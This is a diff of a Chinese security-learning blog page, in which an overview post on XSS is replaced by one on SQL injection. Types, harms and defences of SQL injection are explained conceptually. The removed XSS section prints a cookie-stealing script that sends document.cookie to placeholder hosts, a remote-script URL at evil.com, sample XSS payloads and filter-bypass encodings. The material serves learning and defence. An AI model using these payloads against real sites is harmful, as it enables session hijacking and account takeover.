@@ -51,24 +51,24 @@
   };
 </script>
 
-  <meta name="description" content="敦兮其若朴，旷兮其若谷">
+  <meta name="description" content="圣人之道，为而不争">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Web安全学习总结——XSS漏洞概述">
-<meta property="og:url" content="http://yoursite.com/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/index.html">
+<meta property="og:title" content="web安全学习总结——SQL注入概述">
+<meta property="og:url" content="http://yoursite.com/2020/02/26/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/index.html">
 <meta property="og:site_name" content="Luoyan&#39;s Blog">
-<meta property="og:description" content="敦兮其若朴，旷兮其若谷">
+<meta property="og:description" content="圣人之道，为而不争">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://i.loli.net/2020/01/06/3vFUh1Z5mVB8gKW.png">
-<meta property="article:published_time" content="2020-02-09T08:59:43.000Z">
-<meta property="article:modified_time" content="2020-02-09T13:23:27.572Z">
+<meta property="og:image" content="https://i.loli.net/2020/02/26/RmkuazI2SvYyNod.png">
+<meta property="article:published_time" content="2020-02-26T04:26:12.000Z">
+<meta property="article:modified_time" content="2020-02-26T04:28:03.645Z">
 <meta property="article:author" content="洛言">
 <meta property="article:tag" content="Web安全">
 <meta property="article:tag" content="学习总结">
-<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://i.loli.net/2020/01/06/3vFUh1Z5mVB8gKW.png">
+<meta name="twitter:image" content="https://i.loli.net/2020/02/26/RmkuazI2SvYyNod.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/">
+<link rel="canonical" href="http://yoursite.com/2020/02/26/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/">
 
 
 <script id="page-configurations">
@@ -80,7 +80,7 @@
   };
 </script>
 
-  <title>Web安全学习总结——XSS漏洞概述 | Luoyan's Blog</title>
+  <title>web安全学习总结——SQL注入概述 | Luoyan's Blog</title>
   
 
 
@@ -220,7 +220,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/09/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E2%80%94XSS%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/26/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94SQL%E6%B3%A8%E5%85%A5%E6%A6%82%E8%BF%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpeg">
@@ -233,7 +233,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Web安全学习总结——XSS漏洞概述
+          web安全学习总结——SQL注入概述
         </h1>
 
         <div class="post-meta">
@@ -244,7 +244,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2020-02-09 16:59:43 / 修改时间：21:23:27" itemprop="dateCreated datePublished" datetime="2020-02-09T16:59:43+08:00">2020-02-09</time>
+              <time title="创建时间：2020-02-26 12:26:12 / 修改时间：12:28:03" itemprop="dateCreated datePublished" datetime="2020-02-26T12:26:12+08:00">2020-02-26</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -276,48 +276,85 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <center>敦兮其若朴，旷兮其若谷</center>
+        <center>圣人之道，为而不争</center>
 
-<p><img src="https://i.loli.net/2020/01/06/3vFUh1Z5mVB8gKW.png" alt="preview.png"></p>
+<p><img src="https://i.loli.net/2020/02/26/RmkuazI2SvYyNod.png" alt="origindddal.png"></p>
 <a id="more"></a>
 
-<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h2><p>跨站脚本攻击-XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。</p>
-<p>XSS攻击是Web攻击中最常见的攻击方法之一，它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击目的，形成了一次有效的XSS攻击。一旦攻击成功，它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨 大的，是web安全的头号大敌。</p>
-<h2 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p>非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS<br>主要是GET类型</p>
-<h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。<br>例如：<code>&lt;srcipt&gt;alert(/xss/)&lt;/srcipt&gt;</code></p>
-<h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>DOM型是特殊的反射型XSS<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);img.src=<span class="string">"http://xxxx/a?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03 漏洞危害"></a>0x03 漏洞危害</h2><blockquote>
-<p>我们把进行XSS攻击的恶意脚本成为XSS Payload。XSS Payload的本质是JavaScript脚本，所以JavaScript可以做什么，XSS攻击就可以做什么。</p>
+<h1 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01 漏洞简介"></a>0x01 漏洞简介</h1><h2 id="SQL语言"><a href="#SQL语言" class="headerlink" title="SQL语言"></a>SQL语言</h2><blockquote>
+<p>结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。</p>
 </blockquote>
-<h3 id="盗取Cookie"><a href="#盗取Cookie" class="headerlink" title="盗取Cookie"></a>盗取Cookie</h3><p>一个最常见的XSS Payload就是盗取用户的Cookie,从而发起Cookie劫持攻击。Cookie中，一般会保存当前用户的登录凭证，如果Cookie被黑客盗取，以为着黑客有可能通过Cookie直接登进用户的账户，进行恶意操作。<br>如下所示，攻击者先加载一个远程脚本：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;xssTest&#x2F;test.php?userName&#x3D;&lt;scriipt src&#x3D;http:&#x2F;&#x2F;www.evil.com&#x2F;evil.js&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-
-<p>而真正的XSS Payload，则写在远程脚本evil.js中。在evil.js中，可以通过下列代码窃取用户Cookie：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img=<span class="built_in">document</span>.createElement(<span class="string">"img"</span>);</span><br><span class="line">img.src=<span class="string">"http://www.xxxx.com/log?"</span>+<span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);  </span><br><span class="line"><span class="built_in">document</span>.body.appendChild(img);</span><br></pre></td></tr></table></figure>
-
-<p>这段代码插入了一张看不见的图片，同时把document.cookie作为参数，发到远程服务器。黑客在拿到cookie后，只需要替换掉自身的cookie，就可以登入被盗取者的账户，进行恶意操作。<br>一个网站的应用只需要接受HTTP的POST请求和GET请求，就可以完成所有的操作，对于黑客而言，仅通过JavaScript就可以完成这些操作。</p>
-<h3 id="蠕虫攻击"><a href="#蠕虫攻击" class="headerlink" title="蠕虫攻击"></a>蠕虫攻击</h3><p>可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用</p>
-<h3 id="常用XSS语句"><a href="#常用XSS语句" class="headerlink" title="常用XSS语句"></a>常用XSS语句</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;xss&#x2F;);&lt;&#x2F;script&gt; &#x2F;&#x2F;经典语句</span><br><span class="line"></span><br><span class="line">&lt;BODY ONLOAD&#x3D;alert(&#39;XSS&#39;)&gt;</span><br><span class="line">&lt;img src&#x3D;x onerror&#x3D;alert(1)&gt;</span><br><span class="line">&lt;svg onload&#x3D;alert(1)&gt;</span><br><span class="line">&lt;a href &#x3D; javasript:alert(1)&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="0x04-漏洞绕过"><a href="#0x04-漏洞绕过" class="headerlink" title="0x04 漏洞绕过"></a>0x04 漏洞绕过</h2><h3 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h3><p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
-<p>比如：</p>
-<script>alert(“xss”);</script>
-<p>可以转换为：</p>
-<ScRipt>ALeRt(“XSS”);</sCRipT>
-<h3 id="关闭标签"><a href="#关闭标签" class="headerlink" title="关闭标签"></a>关闭标签</h3><p>有时候我们需要关闭标签来使我们的XSS生效。</p>
-<p>比如：“&gt;<script>alert(“Hi”);</script></p>
-<h3 id="使用hex编码绕过"><a href="#使用hex编码绕过" class="headerlink" title="使用hex编码绕过"></a>使用hex编码绕过</h3><p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
-<p>比如：<script>alert(“xss”);</script>可以转换为：<br>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</p>
-<h3 id="JS编码"><a href="#JS编码" class="headerlink" title="JS编码"></a>JS编码</h3><p>三个八进制数；如果不够前面补0<br>两个十六进制数字；如果不够前面补0<br>四个十六进制数字；如果不够前面补0<br>控制字符</p>
-<h3 id="HTML实体编码"><a href="#HTML实体编码" class="headerlink" title="HTML实体编码"></a>HTML实体编码</h3><p>以<code>&amp;</code>开始<code>;</code>结束</p>
-<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>%27<br>考虑HTML的渲染方式选择合适的编码方式进行测试</p>
-<h2 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05 漏洞防御"></a>0x05 漏洞防御</h2><p>过滤输入的数据，和非法字符<code>‘ “ &lt; &gt; on* 等”’</code><br>输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等</p>
+<h2 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h2><blockquote>
+<p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>
+</blockquote>
+<h1 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h1><blockquote>
+<p>没有对用户的输入输出进行安全过滤，导致后台直接将用户的输入作为SQL语句的一部分，执行操作，产生危害</p>
+<p>通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。</p>
+</blockquote>
+<h1 id="0x03-漏洞类型"><a href="#0x03-漏洞类型" class="headerlink" title="0x03 漏洞类型"></a>0x03 漏洞类型</h1><h2 id="基于从服务器接收到的响应"><a href="#基于从服务器接收到的响应" class="headerlink" title="基于从服务器接收到的响应"></a>基于从服务器接收到的响应</h2><ul>
+<li>​    基于错误的SQL注入</li>
+<li>​    联合查询的类型</li>
+<li>​    堆查询注射</li>
+<li>​    SQL 盲注<ul>
+<li>基于布尔SQL盲注</li>
+<li>基于时间的SQL盲注</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+</li>
+</ul>
+<h2 id="基于如何处理输入的SQL查询-数据类型"><a href="#基于如何处理输入的SQL查询-数据类型" class="headerlink" title="基于如何处理输入的SQL查询(数据类型)"></a>基于如何处理输入的SQL查询(数据类型)</h2><ul>
+<li>基于字符串</li>
+<li>基于报错的SQL盲注</li>
+</ul>
+<h2 id="基于程度和顺序的注入-哪里发生了影响"><a href="#基于程度和顺序的注入-哪里发生了影响" class="headerlink" title="基于程度和顺序的注入(哪里发生了影响)"></a>基于程度和顺序的注入(哪里发生了影响)</h2><ul>
+<li>一阶注入</li>
+</ul>
+<blockquote>
+<p>一阶注入是指输入的注射语句对WEB直接产生了影响，出现了结果。</p>
+</blockquote>
+<ul>
+<li>二阶注入</li>
+</ul>
+<blockquote>
+<p>二阶注入类似存储型XSS，是指输入提交的语句，无法直接对WEB应用程序产生影响，通过其他的辅助间接的对WEB产生危害，这样的就被成为是二阶注入</p>
+</blockquote>
+<h2 id="基于注入点的位置上的"><a href="#基于注入点的位置上的" class="headerlink" title="基于注入点的位置上的"></a>基于注入点的位置上的</h2><ul>
+<li>通过用户输入的表单域的注射</li>
+<li>通过Cookie注射</li>
+<li>通过服务器变量注射。（基于头部信息的注射）</li>
+</ul>
+<h1 id="0x04-漏洞危害"><a href="#0x04-漏洞危害" class="headerlink" title="0x04 漏洞危害"></a>0x04 漏洞危害</h1><p>危害非常高，例如：</p>
+<ul>
+<li>数据库信息泄露</li>
+<li>网页篡改</li>
+<li>网站被挂马，传播恶意软件</li>
+<li>数据库被恶意操纵</li>
+<li>服务器被远程控制，被安葬后门</li>
+<li>破坏硬盘数据，瘫痪全系统</li>
+</ul>
+<h1 id="0x05-漏洞防御"><a href="#0x05-漏洞防御" class="headerlink" title="0x05 漏洞防御"></a>0x05 漏洞防御</h1><h2 id="注入原因"><a href="#注入原因" class="headerlink" title="注入原因"></a>注入原因</h2><ul>
+<li>不正当的类型处理</li>
+<li>不安全的数据库配置</li>
+<li>不合理的查询集处理</li>
+<li>不当的错误处理</li>
+<li>转义字符处理不合适</li>
+<li>多个提交处理不当</li>
+</ul>
+<h2 id="存在位置"><a href="#存在位置" class="headerlink" title="存在位置"></a>存在位置</h2><ul>
+<li>任何客户端可控，传递到服务器的变量</li>
+<li>必须带有参数传递，参数值带入到数据库查询</li>
+<li>服务器没有进行过滤或者过滤不严格</li>
+</ul>
+<h2 id="代码层面防御"><a href="#代码层面防御" class="headerlink" title="代码层面防御"></a>代码层面防御</h2><blockquote>
+<p>对用户输入的内容进行转义（PHP中addslashes()、mysql_real_escape()函数）。<br>限制关键字的输入（PHP中preg_replace()函数正则替换关键字），限制输入的长度 。<br>使用SQL语句预处理，对SQL语句首先进行预编译，然后进行参数绑定，最后传入参数。</p>
+</blockquote>
+<h2 id="网络层面防御"><a href="#网络层面防御" class="headerlink" title="网络层面防御"></a>网络层面防御</h2><blockquote>
+<p>部署防火墙</p>
+</blockquote>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnblogs.com/xiaoqiyue/p/9026859.html" target="_blank" rel="noopener">SQL注入</a></p>
+<p><a href="https://www.cnblogs.com/lsdb/p/9612424.html" target="_blank" rel="noopener">SQL注入理解与防御</a></p>
+<p><a href="https://xz.aliyun.com/t/5878#toc-51" target="_blank" rel="noopener">[红日安全]Web安全Day1 - SQL注入实战攻防</a></p>
+<p><a href="https://blog.csdn.net/BeatRex/article/details/91901196" target="_blank" rel="noopener">SQL注入分类、防御</a></p>
 
     </div>
 
@@ -329,7 +366,7 @@
           <div class="post-tags">
               <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
               <a href="/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" rel="tag"># 学习总结</a>
-              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"># SQL注入</a>
           </div>
 
         
@@ -338,13 +375,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2020/01/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-Reverse-novice/" rel="prev" title="攻防世界-Reverse-novice">
-      <i class="fa fa-chevron-left"></i> 攻防世界-Reverse-novice
+    <a href="/2020/02/10/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/" rel="prev" title="Web安全学习总结—文件上传漏洞概述">
+      <i class="fa fa-chevron-left"></i> Web安全学习总结—文件上传漏洞概述
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2020/02/10/Web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0/" rel="next" title="Web安全学习总结—文件上传漏洞概述">
-      Web安全学习总结—文件上传漏洞概述 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -404,7 +438,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-漏洞简介"><span class="nav-text">0x01 漏洞简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-漏洞原理"><span class="nav-text">0x02 漏洞原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型"><span class="nav-text">反射型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型"><span class="nav-text">存储型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM型"><span class="nav-text">DOM型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-漏洞危害"><span class="nav-text">0x03 漏洞危害</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#盗取Cookie"><span class="nav-text">盗取Cookie</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#蠕虫攻击"><span class="nav-text">蠕虫攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#常用XSS语句"><span class="nav-text">常用XSS语句</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-漏洞绕过"><span class="nav-text">0x04 漏洞绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#改变大小写"><span class="nav-text">改变大小写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关闭标签"><span class="nav-text">关闭标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用hex编码绕过"><span class="nav-text">使用hex编码绕过</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JS编码"><span class="nav-text">JS编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HTML实体编码"><span class="nav-text">HTML实体编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#URL编码"><span class="nav-text">URL编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-漏洞防御"><span class="nav-text">0x05 漏洞防御</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-漏洞简介"><span class="nav-text">0x01 漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL语言"><span class="nav-text">SQL语言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL-注入"><span class="nav-text">SQL 注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-漏洞原理"><span class="nav-text">0x02 漏洞原理</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-漏洞类型"><span class="nav-text">0x03 漏洞类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#基于从服务器接收到的响应"><span class="nav-text">基于从服务器接收到的响应</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于如何处理输入的SQL查询-数据类型"><span class="nav-text">基于如何处理输入的SQL查询(数据类型)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于程度和顺序的注入-哪里发生了影响"><span class="nav-text">基于程度和顺序的注入(哪里发生了影响)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#基于注入点的位置上的"><span class="nav-text">基于注入点的位置上的</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-漏洞危害"><span class="nav-text">0x04 漏洞危害</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x05-漏洞防御"><span class="nav-text">0x05 漏洞防御</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#注入原因"><span class="nav-text">注入原因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存在位置"><span class="nav-text">存在位置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#代码层面防御"><span class="nav-text">代码层面防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络层面防御"><span class="nav-text">网络层面防御</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文章"><span class="nav-text">参考文章</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -420,7 +454,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-count">6</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -433,7 +467,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
